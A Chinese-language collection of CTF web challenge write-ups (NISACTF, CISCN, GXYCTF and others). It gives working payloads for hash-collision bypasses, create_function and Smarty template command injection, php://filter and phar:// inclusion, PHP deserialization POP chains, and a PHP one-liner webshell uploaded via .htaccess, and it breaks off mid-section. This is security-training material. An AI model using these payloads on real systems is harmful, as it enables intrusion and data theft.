CLOSE [NISACTF 2022]level-up打开环境，什么有用的都没有查看源代码显示： 1&lt;!-- here is level 1 --&gt; 用disearch扫一下扫出来个robots.txt，访问一下显示： 1Disallow: level_2_1s_h3re.php 访问一下：http:&#x2F;&#x2F;…&#x2F;level_2_1s_h3re.php得到level 2的源码 12345678910111213141516171819202122&lt;?php //here is level 2 error_reporting(0); include &quot;str.php&quot;; if (isset($_POST[&#x27;array1&#x27;]) &amp;&amp; isset($_POST[&#x27;array2&#x27;]))&#123; $a1 = (string)$_POST[&#x27;array1&#x27;]; $a2 = (string)$_POST[&#x27;array2&#x27;]; if ($a1 == $a2)&#123; die(&quot;????&quot;); &#125; if (md5($a1) === md5($a2))&#123; echo $level3; &#125; else&#123; die(&quot;level 2 failed ...&quot;); &#125; &#125; else&#123; show_source(__FILE__); &#125; ?&gt; md5强相等（Md5碰撞）(string类型)这里我们看到是要我们传入的参数md5之后的值相等，而且三个&#x3D;，为强比较类型强比较绕过一般可以用数组进行绕过： 1array1[]=1&amp;array2[]=1 但是发现不行，因为在定义$a1 和 $a2的时候，把array1和array2强制转换为了string类型，所以就不能利用数组进行绕过那就只能用md5强碰撞绕过 1array1=1%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%B0%90%968%96%85%2B%9BM%81g%81p%C9%BF4%00%1A%EC%3C%A5%22d%D46%86z%8A%CC%9F%9F%1D%87%19%FE%E2%CA%25%10%D5%E7%E9%DF%FB%9C%CF%00%A1%E96G%DC%F7%7F%2C%9Du%3CcfjtX-j%19%EA0%9BT%CF%F1%04%85WA%0E%F4%E3%EDu%D5%A3l6o%05%FAn%FB%B3KK%91%CFA0J%C1ir%07%9C%1F%9D%91%EB0l%BCb%FD%1DD%18n%AC%D2%CB%C6v%E3%C8W%CCd%15%C2&amp;array2=1%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%B0%90%968%96%85%2B%9BM%81g%81p%C9%BF4%00%1A%EC%BC%A5%22d%D46%86z%8A%CC%9F%9F%1D%87%19%FE%E2%CA%25%10%D5%E7%E9%DF%FB%9CO%01%A1%E96G%DC%F7%7F%2C%9Du%3Cc%E6jtX-j%19%EA0%9BT%CF%F1%04%85WA%0E%F4%E3%EDu%D5%A3%EC6o%05%FAn%FB%B3KK%91%CFA0J%C1ir%07%9C%1F%9D%91%EB0l%3Cb%FD%1DD%18n%AC%D2%CB%C6v%E3%C8%D7%CCd%15%C2 ！！！这里要注意要用burp来post传参，不然会被二次编码然后得到 1Level___3.php 源码为： 12345678910111213141516171819202122 &lt;?php //here is level 3 error_reporting(0); include &quot;str.php&quot;; if (isset($_POST[&#x27;array1&#x27;]) &amp;&amp; isset($_POST[&#x27;array2&#x27;]))&#123; $a1 = (string)$_POST[&#x27;array1&#x27;]; $a2 = (string)$_POST[&#x27;array2&#x27;]; if ($a1 == $a2)&#123; die(&quot;????&quot;); &#125; if (sha1($a1) === sha1($a2))&#123; echo $level4; &#125; else&#123; die(&quot;level 3 failed ...&quot;); &#125; &#125; else&#123; show_source(__FILE__); &#125; ?&gt; 这里就是sha1强碰撞了 sha1强碰撞这个和md5差不多，直接放payload 1array1=%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01%7FF%DC%93%A6%B6%7E%01%3B%02%9A%AA%1D%B2V%0BE%CAg%D6%88%C7%F8K%8CLy%1F%E0%2B%3D%F6%14%F8m%B1i%09%01%C5kE%C1S%0A%FE%DF%B7%608%E9rr/%E7%ADr%8F%0EI%04%E0F%C20W%0F%E9%D4%13%98%AB%E1.%F5%BC%94%2B%E35B%A4%80-%98%B5%D7%0F%2A3.%C3%7F%AC5%14%E7M%DC%0F%2C%C1%A8t%CD%0Cx0Z%21Vda0%97%89%60k%D0%BF%3F%98%CD%A8%04F%29%A1&amp;array2=%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01sF%DC%91f%B6%7E%11%8F%02%9A%B6%21%B2V%0F%F9%CAg%CC%A8%C7%F8%5B%A8Ly%03%0C%2B%3D%E2%18%F8m%B3%A9%09%01%D5%DFE%C1O%26%FE%DF%B3%DC8%E9j%C2/%E7%BDr%8F%0EE%BC%E0F%D2%3CW%0F%EB%14%13%98%BBU.%F5%A0%A8%2B%E31%FE%A4%807%B8%B5%D7%1F%0E3.%DF%93%AC5%00%EBM%DC%0D%EC%C1%A8dy%0Cx%2Cv%21V%60%DD0%97%91%D0k%D0%AF%3F%98%CD%A4%BCF%29%B1 也记得要用Burp传噢然后回显 1level_level_4.php 访问 12345678910111213141516171819202122 &lt;?php //here is last level error_reporting(0); include &quot;str.php&quot;; show_source(__FILE__); $str = parse_url($_SERVER[&#x27;REQUEST_URI&#x27;]); if($str[&#x27;query&#x27;] == &quot;&quot;)&#123; echo &quot;give me a parameter&quot;; &#125; if(preg_match(&#x27;/ |_|20|5f|2e|\\./&#x27;,$str[&#x27;query&#x27;]))&#123; die(&quot;blacklist here&quot;); &#125; if($_GET[&#x27;NI_SA_&#x27;] === &quot;txw4ever&quot;)&#123; die($level5); &#125; else&#123; die(&quot;level 4 failed ...&quot;); &#125; ?&gt; give me a parameterlevel 4 failed ... 我们看到正则那里过滤了_，但是我们要传的参数名字中含有_，这里就要提到php的一个特性了 php特性：将_解析为空格php的变量解析绕过, php会把请求参数中的非法字符转为下划线，所以php会将空格解析成_所以payload为:(在urlencode中空格会被转换为+，所以我们直接写+) 1NI+SA+=txw4ever 回显：55_5_55.php 1234567891011121314&lt;?php //sorry , here is true last level //^_^ error_reporting(0); include &quot;str.php&quot;; $a = $_GET[&#x27;a&#x27;]; $b = $_GET[&#x27;b&#x27;]; if(preg_match(&#x27;/^[a-z0-9_]*$/isD&#x27;,$a))&#123; show_source(__FILE__); &#125; else&#123; $a(&#x27;&#x27;,$b); &#125; 这个正则表达式的意思是，参数a开头不能是字符数字和下划线最后的/i是不区分大小写，/s匹配任何不可见字符 &#x2F;D如果以$限制结尾字符，则不允许结尾有换行看到： 1$a(&#x27;&#x27;,$b); 这个网上搜了下相关绕过，发现了这个函数：特别看到$action(&#39;&#39;, $arg);就条件反射肯定是create_function() create_function()函数123create_function(string $args,string $code)//string $args 声明的函数变量部分//string $code 执行的方法代码部分 create_function()会创建一个匿名函数（lambda样式） create_function()函数会在内部执行 eval()，我们发现是执行了后面的return语句，属于create_function()中的第二个参数string $code位置。所以有： 123456789101112131415?a=\\create_function&amp;b=&#125;system(&#x27;cat /flag&#x27;);/*/*因为不能以那些开头，所以以\\转义符号开头然后$a写函数变量部分，为create_function()然后$b处写return语句，可写可不写；可以是：?a=\\create_function&amp;b=&#125;system(&#x27;cat /flag&#x27;);/*也可以是?a=\\create_function&amp;b=return &#x27;qw&#x27;;&#125;system(&#x27;cat /flag&#x27;);/*然后&#125;闭合else那里的&#123;后面加上执行命令的语句最后```/*将后面的函数注释从而进行任意代码执行漏洞然后就得到了最终的payload：?a=\\create_function&amp;b=&#125;system(&#x27;cat /flag&#x27;);/**/ NSSCTF{de8e94af-9e79-44ef-8d7d-12617a67d0ed} [鹏城杯 2022]简单包含1234 &lt;?php highlight_file(__FILE__); include($_POST[&quot;flag&quot;]); //flag in /var/www/html/flag.php; 直接试试伪协议： 12345flag=php://filter/read=convert.base64-encode/resource=/var/www/html/flag.php//发现有绕过，过滤了flagflag=php://filter/read=convert.base64-encode/resource=/var/www/html/f*//发现没有反应，那就先查看下源码flag=php://filter/read=convert.base64-encode/resource=index.php 发现一堆Base64的东西，那就解码，得到： 12345678910&lt;?php$path = $_POST[&quot;flag&quot;];if (strlen(file_get_contents(&#x27;php://input&#x27;)) &lt; 800 &amp;&amp; preg_match(&#x27;/flag/&#x27;, $path)) &#123; echo &#x27;nssctf waf!&#x27;;&#125; else &#123; @include($path);&#125;?&gt; 看到这里我们要使输入的字符数大于800，所以这里我们就输入一定数量的参数才行，所以有： 12a=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&amp;flag=php://filter/read=convert.base64-encode/resource=/var/www/html/flag.php (这里(strlen(file_get_contents(‘php:&#x2F;&#x2F;input’)) &lt; 800 &amp;&amp; preg_match(‘&#x2F;flag&#x2F;‘, $path)我们要使这句话为false，这样才可以执行else里面的语句，因为我们输入的参数值大于了800，所以第一个为true，所以第二个要输入完整的路径，不能绕过flag，这样让他为false，true&amp;&amp;false&#x3D;false，就可以执行else里面的语句了)然后再把传参之后回显的值base64解码即可NSSCTF{835b7731-e7a2-4e6d-af6b-f7f1d7f713e4} [NISACTF 2022]babyupload打开是一个文件上传界面直接上传php文件不行，而且抓包改后缀也不可以查看源代码，发现了个 1&lt;!-- /source --&gt; 访问一下，下载得到了个app.py文件 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182from flask import Flask, request, redirect, g, send_from_directory import sqlite3 import os import uuid app = Flask(__name__) SCHEMA = &quot;&quot;&quot;CREATE TABLE files ( id text primary key, path text ); &quot;&quot;&quot; def db(): g_db = getattr(g, &#x27;_database&#x27;, None) if g_db is None: g_db = g._database = sqlite3.connect(&quot;database.db&quot;) return g_db @app.before_first_request def setup(): os.remove(&quot;database.db&quot;) cur = db().cursor() cur.executescript(SCHEMA) @app.route(&#x27;/&#x27;) def hello_world(): return &quot;&quot;&quot;&lt;!DOCTYPE html&gt; &lt;html&gt; &lt;body&gt; &lt;form action=&quot;/upload&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt; Select image to upload: &lt;input type=&quot;file&quot; name=&quot;file&quot;&gt; &lt;input type=&quot;submit&quot; value=&quot;Upload File&quot; name=&quot;submit&quot;&gt;&lt;/form&gt; &lt;!-- /source --&gt; &lt;/body&gt; &lt;/html&gt;&quot;&quot;&quot; @app.route(&#x27;/source&#x27;) def source(): return send_from_directory(directory=&quot;/var/www/html/&quot;, path=&quot;www.zip&quot;, as_attachment=True) @app.route(&#x27;/upload&#x27;, methods=[&#x27;POST&#x27;]) def upload(): if &#x27;file&#x27; not in request.files: return redirect(&#x27;/&#x27;) file = request.files[&#x27;file&#x27;] if &quot;.&quot; in file.filename: return &quot;Bad filename!&quot;, 403 conn = db() cur = conn.cursor() uid = uuid.uuid4().hex try: cur.execute(&quot;insert into files (id, path) values (?, ?)&quot;, (uid, file.filename,)) except sqlite3.IntegrityError: return &quot;Duplicate file&quot; conn.commit() file.save(&#x27;uploads/&#x27; + file.filename) return redirect(&#x27;/file/&#x27; + uid) @app.route(&#x27;/file/&lt;id&gt;&#x27;) def file(id): conn = db() cur = conn.cursor() cur.execute(&quot;select path from files where id=?&quot;, (id,)) res = cur.fetchone() if res is None: return &quot;File not found&quot;, 404 # print(res[0]) with open(os.path.join(&quot;uploads/&quot;, res[0]), &quot;r&quot;) as f: return f.read() if __name__ == &#x27;__main__&#x27;: app.run(host=&#x27;0.0.0.0&#x27;, port=80) 看到这段代码 123456789101112131415161718@app.route(&#x27;/upload&#x27;, methods=[&#x27;POST&#x27;]) def upload(): if &#x27;file&#x27; not in request.files: return redirect(&#x27;/&#x27;) file = request.files[&#x27;file&#x27;] if &quot;.&quot; in file.filename: return &quot;Bad filename!&quot;, 403 conn = db() cur = conn.cursor() uid = uuid.uuid4().hex try: cur.execute(&quot;insert into files (id, path) values (?, ?)&quot;, (uid, file.filename,)) except sqlite3.IntegrityError: return &quot;Duplicate file&quot; conn.commit() file.save(&#x27;uploads/&#x27; + file.filename) return redirect(&#x27;/file/&#x27; + uid) 首先是post方式传递路径名字，然后又出现了过滤，表示如果路径名出现了 . ，那就返回403，即上传的文件不能有后缀名 12if &quot;.&quot; in file.filename: return &quot;Bad filename!&quot;, 403 上传文件后生成一个uuid，并将uuid和文件名存入数据库中，并返回文件的uuid。再通过/file/uuid访问文件，通过查询数据库得到对应文件名，在文件名前拼接uploads/后读取该路径下上传的文件。 12345678910 try: cur.execute(&quot;insert into files (id, path) values (?, ?)&quot;, (uid, file.filename,)) except sqlite3.IntegrityError: return &quot;Duplicate file&quot; conn.commit() 和with open(os.path.join(&quot;uploads/&quot;, res[0]), &quot;r&quot;) as f: return f.read() 上传的文件没有后缀名，不能直接利用，所以就要利用os.path.join()函数漏洞 os.path.join()函数漏洞绝对路径拼接漏洞 os.path.join(path,paths)函数用于将多个文件路径连接成一个组合的路径。第一个函数通常包含了基础路径，而之后的每个参数被当作组件拼接到基础路径之后。然而，这个函数有一个少有人知的特性，如果拼接的某个路径以 / 开头，那么包括基础路径在内的所有前缀路径都将被删除，该路径将视为绝对路径所以当上传的文件名为 &#x2F;flag时 ，那么进行路径拼接时，uploads&#x2F; 将被删除，读取到的就是根目录下的 flag 文件。因此我们只需要传输一个文件名为&#x2F;flag的文件就可以得到flag的uid。然后再访问对应路径就可以得到flag直接上传个一句话木马，然后抓包改文件名为&#x2F;flag，然后访问对应路径，&#x2F;file&#x2F;bbfce872aa9a4b26b069edf5776f7389，就可以得到flagNSSCTF{6b791264-a4c6-4b3d-940d-a0044ef1d0f9} [CISCN 2019华东南]Web11抓包看一下，没有什么发现但是我们看到环境的页面有，XFF头，这个算是给我们的一个提示了 Smarty 模板注入控制XFF进行命令执行（这是要在前端有IP相关回显的情况）payload: 123456789101112131415161718X-Forwarded-For: &#123;&#123;system(&quot;ls&quot;)&#125;&#125;&#123;$smarty.version&#125; //smarty的版本号有下面几种标签可以利用：可以使用&#123;php&#125;&#123;/php&#125;标签来执行被包裹其中的php指令&#123;php&#125;phpinfo();&#123;/php&#125; Smarty已经废弃&#123;php&#125;标签，强烈建议不要使用。在Smarty 3.1，&#123;php&#125;仅在SmartyBC中可用。&#123;literal&#125; 标签 &#123;literal&#125;可以让一个模板区域的字符原样输出。 这经常用于保护页面上的Javascript或css样式表，避免因为Smarty的定界符而错被解析。&#123;if&#125;标签&#123;if phpinfo()&#125;&#123;/if&#125; 其中，我个人感觉if标签是最常用的，有一些常用的payload 12345&#123;if phpinfo()&#125;&#123;/if&#125;&#123;if system(&#x27;ls&#x27;)&#125;&#123;/if&#125;&#123; readfile(&#x27;/flag&#x27;) &#125;&#123;if show_source(&#x27;/flag&#x27;)&#125;&#123;/if&#125;&#123;if system(&#x27;cat ../../../flag&#x27;)&#125;&#123;/if&#125; 那这一题，我们直接添加XFF头，然后进行命令执行即可 1X-Forwarded-For:&#123;if system(&#x27;cat /flag&#x27;)&#125;&#123;/if&#125; NSSCTF{6616e149-8544-417a-9dc5-a4eabd92ccb3} [HUBUCTF 2022 新生赛]checkin打开环境，看到源码 12345678910111213141516 &lt;?php show_source(__FILE__); $username = &quot;this_is_secret&quot;; $password = &quot;this_is_not_known_to_you&quot;; include(&quot;flag.php&quot;);//here I changed those two $info = isset($_GET[&#x27;info&#x27;])? $_GET[&#x27;info&#x27;]: &quot;&quot; ; $data_unserialize = unserialize($info); if ($data_unserialize[&#x27;username&#x27;]==$username&amp;&amp;$data_unserialize[&#x27;password&#x27;]==$password)&#123; echo $flag; &#125;else&#123; echo &quot;username or password error!&quot;; &#125; ?&gt; username or password error! 说实话，这题只有一颗星不到的难度，但是我看到的时候真觉得哪有那么简单后面看了下评论区，说小心不要被骗了，于是，再好好来看下代码首先我们可以确定的是，我们需要GET传参一个info看到，他给了个注释，提示他这里改变了username和password这两个参数的值所以这里我们是没有办法比较的，因为我们也不知道他改成了啥但是，这里可以利用一个特性 弱类型比较：true与非零非NULL变量比较布尔类型True与非零非NULL变量比较都会是True。所以我们这里只要把info里的username和password都赋值为true就可以exp如下： 12345678&lt;?php $a = [ &#x27;username&#x27; =&gt; true, &#x27;password&#x27; =&gt; true ]; $info = serialize($a); echo $info; ?&gt; payload如下： 1?info=a:2:&#123;s:8:&quot;username&quot;;b:1;s:8:&quot;password&quot;;b:1;&#125; NSSCTF{930a9638-050f-44f3-afe0-1fcefd52ae67} [NISACTF 2022]babyserialize反序列化构造pop链（很多魔术方法结合）源码如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081&lt;?php include &quot;waf.php&quot;; class NISA&#123; public $fun=&quot;show_me_flag&quot;; public $txw4ever; public function __wakeup() &#123; if($this-&gt;fun==&quot;show_me_flag&quot;)&#123; hint(); &#125; &#125; function __call($from,$val)&#123; $this-&gt;fun=$val[0]; &#125; public function __toString() &#123; echo $this-&gt;fun; return &quot; &quot;; &#125; public function __invoke() &#123; checkcheck($this-&gt;txw4ever); @eval($this-&gt;txw4ever); &#125; &#125; class TianXiWei&#123; public $ext; public $x; public function __wakeup() &#123; $this-&gt;ext-&gt;nisa($this-&gt;x); &#125; &#125; class Ilovetxw&#123; public $huang; public $su; public function __call($fun1,$arg)&#123; $this-&gt;huang-&gt;fun=$arg[0]; &#125; public function __toString()&#123; $bb = $this-&gt;su; return $bb(); &#125; &#125; class four&#123; public $a=&quot;TXW4EVER&quot;; private $fun=&#x27;abc&#x27;; public function __set($name, $value) &#123; $this-&gt;$name=$value; if ($this-&gt;fun = &quot;sixsixsix&quot;)&#123; strtolower($this-&gt;a); &#125; &#125; &#125; if(isset($_GET[&#x27;ser&#x27;]))&#123; @unserialize($_GET[&#x27;ser&#x27;]); &#125;else&#123; highlight_file(__FILE__); &#125; //func checkcheck($data)&#123; // if(preg_match(......))&#123; // die(something wrong); // &#125; //&#125; //function hint()&#123; // echo &quot;.......&quot;; // die(); //&#125; ?&gt; 这里先写出反序列化常见的魔术方法的调用方法 12345678910__invoke():以调用函数的方式调用对象的时候，就会调用该方法__construst():具有构造函数的类在创建新对象的时候，回调此方法__destruct():反序列化的时候，或者对象销毁的时候调用__wakeup():反序列化的时候调用__sleep():序列化的时候调用__toString():把类当成字符串的时候调用，一般在echo处生效__set():在给不可访问的(protected或者private)或者不存在的属性赋值的时候，会被调用__get():读取不可访问或者不存在的属性的时候，进行赋值__call():在对象中调用一个不可访问的方法的时候，会被执行 首先最后肯定是__invoke() 魔术方法里的eval()函数然后就是 Ilovetxw这个类中的__toString()方法，用来触发__invoke()之后看到__set()方法，这种方法中的 strtolower()函数，这个函数的功能是把字符串全部转化为小写用从__set()反推到__call()，而__call()方法中的fun变量是在four类中定义的私有变量然后由__call()又反推到了__wakeup()方法，而__wakeup()中的nisa()方法，根本不存在，所以成功无法调用，进而成功触发了__call()所以总的链子为： 1NISA(__invoke())--&gt;Ilovetxw(__toString())--&gt;four(__set())--&gt;Ilovetxw(__call())--&gt;TianXiWei(__wakeup()) exp如下： 12345678910111213141516171819202122232425262728&lt;?php class NISA&#123; public $fun; public $txw4ever=&#x27;system(&quot;ls&quot;);&#x27;;&#125; class TianXiWei&#123; public $ext; public $x; &#125; class Ilovetxw&#123; public $huang; public $su; &#125; class four&#123; public $a; private $fun=&#x27;abc&#x27;; &#125; $qw=new TianXiWei; //创建对象，入口为__wakeup()方法，所以new其所在的类$qw-&gt;ext=new Ilovetxw; //__call()$qw-&gt;ext-&gt;huang=new four; //__set()$qw-&gt;ext-&gt;huang-&gt;a=new Ilovetxw; //__toString()$qw-&gt;ext-&gt;huang-&gt;a-&gt;su=new NISA; //__invoke()echo urlencode(serialize($qw)); //有private属性的变量，所以序列化之后有不可见字符，所以要urlencode?&gt; 然后payload为： 1?ser=O%3A9%3A%22TianXiWei%22%3A2%3A%7Bs%3A3%3A%22ext%22%3BO%3A8%3A%22Ilovetxw%22%3A2%3A%7Bs%3A5%3A%22huang%22%3BO%3A4%3A%22four%22%3A2%3A%7Bs%3A1%3A%22a%22%3BO%3A8%3A%22Ilovetxw%22%3A2%3A%7Bs%3A5%3A%22huang%22%3BN%3Bs%3A2%3A%22su%22%3BO%3A4%3A%22NISA%22%3A2%3A%7Bs%3A3%3A%22fun%22%3BN%3Bs%3A8%3A%22txw4ever%22%3Bs%3A13%3A%22system%28%22ls%22%29%3B%22%3B%7D%7Ds%3A9%3A%22%00four%00fun%22%3Bs%3A3%3A%22abc%22%3B%7Ds%3A2%3A%22su%22%3BN%3B%7Ds%3A1%3A%22x%22%3BN%3B%7D; 显示something wrong,看着源码里的最后的几行，猜测可能是过滤了某些东西，经过测试之后，发现是过滤了system，把system改成SysTEm,大小写绕过即可 12345678910//func checkcheck($data)&#123; // if(preg_match(......))&#123; // die(something wrong); // &#125; //&#125; //function hint()&#123; // echo &quot;.......&quot;; // die(); //&#125; 所以最后的payload为: 123?ser=O%3A9%3A%22TianXiWei%22%3A2%3A%7Bs%3A3%3A%22ext%22%3BO%3A8%3A%22Ilovetxw%22%3A2%3A%7Bs%3A5%3A%22huang%22%3BO%3A4%3A%22four%22%3A2%3A%7Bs%3A1%3A%22a%22%3BO%3A8%3A%22Ilovetxw%22%3A2%3A%7Bs%3A5%3A%22huang%22%3BN%3Bs%3A2%3A%22su%22%3BO%3A4%3A%22NISA%22%3A2%3A%7Bs%3A3%3A%22fun%22%3BN%3Bs%3A8%3A%22txw4ever%22%3Bs%3A15%3A%22SysTEm%28%22ls+%2F%22%29%3B%22%3B%7D%7Ds%3A9%3A%22%00four%00fun%22%3Bs%3A3%3A%22abc%22%3B%7Ds%3A2%3A%22su%22%3BN%3B%7Ds%3A1%3A%22x%22%3BN%3B%7D?ser=O%3A9%3A%22TianXiWei%22%3A2%3A%7Bs%3A3%3A%22ext%22%3BO%3A8%3A%22Ilovetxw%22%3A2%3A%7Bs%3A5%3A%22huang%22%3BO%3A4%3A%22four%22%3A2%3A%7Bs%3A1%3A%22a%22%3BO%3A8%3A%22Ilovetxw%22%3A2%3A%7Bs%3A5%3A%22huang%22%3BN%3Bs%3A2%3A%22su%22%3BO%3A4%3A%22NISA%22%3A2%3A%7Bs%3A3%3A%22fun%22%3BN%3Bs%3A8%3A%22txw4ever%22%3Bs%3A27%3A%22SysTEM%28%22cat+%2Ffllllllaaag%22%29%3B%22%3B%7D%7Ds%3A9%3A%22%00four%00fun%22%3Bs%3A3%3A%22abc%22%3B%7Ds%3A2%3A%22su%22%3BN%3B%7Ds%3A1%3A%22x%22%3BN%3B%7D NSSCTF{ba4813c0-9e91-4446-829c-d004ed064d52}这道题我还看到了一个师傅的另解，太强了！ 1234567891011class NISA&#123; public $txw4ever=&#x27;SYSTEM(&quot;cat /f*&quot;);&#x27;; &#125; class Ilovetxw&#123; &#125; $a = new NISA(); $a-&gt;fun = ne[[【Web漏洞】SSTI]]w Ilovetxw(); $a-&gt;fun-&gt;su = $a; $a = serialize($a); echo $a; 在NISA:: _ _ wakeup里，做弱比较的时候就能触发__toString [NISACTF 2022]bingdundun~打开环境是一个文件上传的界面但是页面的一句话，算是一个提示吧仅可以上传墩墩喜欢的【图片或压缩包】文件类型哦这里说压缩包，我们很容易想到一个伪协议 phar:&#x2F;&#x2F;伪协议如果同时存在可以上传图片的功能，那我们就可以利用phar:&#x2F;&#x2F;伪协议，如果只能上传zip压缩包文件，那就用zip:&#x2F;&#x2F;伪协议，如果只能上传txt文件，那就用phar:&#x2F;&#x2F;伪协议。phar:// 跟zip: //协议差不多，都是可以访问zip格式压缩包内容这里我直接把一句话木马压缩进压缩包，生成1.zip然后显示 1/var/www/html\\/xxxxxxxxxxxxxxxxxxxxxxxx.zip 成功上传了冰墩墩喜爱的文件，然后呢？ 然后访问 12http://x.x.x:xxxxx/?bingdundun=phar://xxxxxxxxxxxxxxxxxxxxxxxx.zip/1//注意无论是什么后缀，phar://伪协议会在末尾默认加一个php后缀，所以我们不用加后缀了 然后getshell即可（这里是允许上传压缩包的，但是万一只允许上传图片的话，可以把php文件打包成zip文件，然后改zip文件的后缀为图片（jpg.png之类的）然后再类似的访问即可：?file&#x3D;phar:&#x2F;&#x2F;upload&#x2F;shell.png&#x2F;shell） [SWPUCTF 2022 新生赛]ez_ez_php打开，源码如下： 123456789101112131415 &lt;?php error_reporting(0); if (isset($_GET[&#x27;file&#x27;])) &#123; if ( substr($_GET[&quot;file&quot;], 0, 3) === &quot;php&quot; ) &#123; echo &quot;Nice!!!&quot;; include($_GET[&quot;file&quot;]); &#125; else &#123; echo &quot;Hacker!!&quot;; &#125; &#125;else &#123; highlight_file(__FILE__); &#125; //flag.php 呀，没有什么好说的，file参数的开头三个字符要是php然后提示有有flag.php文件，直接php:&#x2F;&#x2F;filter伪协议读取flag.php php:&#x2F;&#x2F;filter伪协议123?file=php://filter/read=convert.base64-encode/resource=flag.php//提示真的flag在flag文件中?file=php://filter/read=convert.base64-encode/resource=flag 然后base64解密即可NSSCTF{4bf4e46c-0f42-4cdf-8d73-2dc4687a1cdb} [NISACTF 2022]midlevel这道题的页面打开和前面那道web11的smarty模板注入的页面只能说是一模一样了那就直接照那题的打法试一试 1X-Forwarded-For:&#123;if system(&#x27;cat /f*&#x27;)&#125;&#123;/if&#125; 直接得到flagNSSCTF{3303c48f-0195-4b88-a682-c0ba6f40f250} [UUCTF 2022 新生赛]websign打开，提示我们查看源代码浏览器打开开发者工具直接查看源代码，就得到了flagNSSCTF{4d7ea0a0-423f-43f9-9d1a-63c499447864} [GXYCTF 2019]BabyUpload首先试一下直接上传php文件，芜湖，似乎不行上传jpg后缀文件，抓包改后缀为php,phtml之类的都不行那就试试.htaccess 文件上传.htaccess但是在上传.htaccess文件时，显示这上传的文件类型太露骨了然后再上传改了后缀的一句话木马时，显示这明显还是php啊那证明可能也有检测我们上传文件的文件内容首先既然提示上传的文件类型太露骨了，那可能是检测了MIME类型 MIME类型检测我们上传了.htaccess之后抓包改改Content-Type头试试把原来的类型改为我蓝色箭头标上的jpg类型然后就提示上传成功 1/var/www/html/upload/b9c2691f3e170da763f746d557d1fb58/.htaccess succesfully uploaded! 然后那个说别懵他，明显还是php啊这里我们试试用其他的一句话木马来代替php的&lt; ?标签，把1.jpg改为下面的内容 无php标签的script一句话木马12GIF89a&lt;script language=&#x27;php&#x27;&gt;@eval($_POST[&quot;qw&quot;]);&lt;/script&gt; 然后发现1.jpg也上传成功 1/var/www/html/upload/b9c2691f3e170da763f746d557d1fb58/1.jpg succesfully uploaded! 我们访问一下，发现可以看到显示了GIF头，但是我们POST传参，qw&#x3D;system(“ls”);之类的却没有任何反应我们传入 